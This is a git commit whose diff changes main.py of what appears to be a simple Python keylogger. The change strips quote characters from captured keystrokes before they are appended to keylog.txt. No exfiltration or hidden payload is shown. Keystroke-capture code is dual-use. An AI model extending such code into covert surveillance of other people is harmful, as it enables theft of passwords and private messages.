282e50c3c25c7da3b13325d98845f385e71fa160
Shourya Shukla <periperidip@gmail.com>
2021-07-12 23:52:37 +0530

    main: improve key parsing for quotes
    The logged keys, when converted to a string to write to a file are
    surrounded by quotes, except when the logged string is a single quote,
    it is enclosed by double quotes. The keylog is not very reader-friendly
    with the quotes.
    
    Therefore, improve the key parsing by taking into account the
    surrounding quotation marks and trim them off the logged text
    appropriately.
    
    Signed-off-by: Shourya Shukla <periperidip@gmail.com>

--- main.py
+++ main.py
@@ -6,7 +6,12 @@ char_count = 0
 def write_to_file(keys_pressed):
 	with open("keylog.txt", "a") as keylog:
 		for key in keys_pressed:
-			keylog.write(str(key))
+			key_string = str(key)
+			if (key_string == "\"'\""):
+				parsed_key = key_string.strip('\"')
+			else:
+				parsed_key = key_string.strip('\'')
+			keylog.write(parsed_key)
 	keylog.close()
 
 def key_press(key):
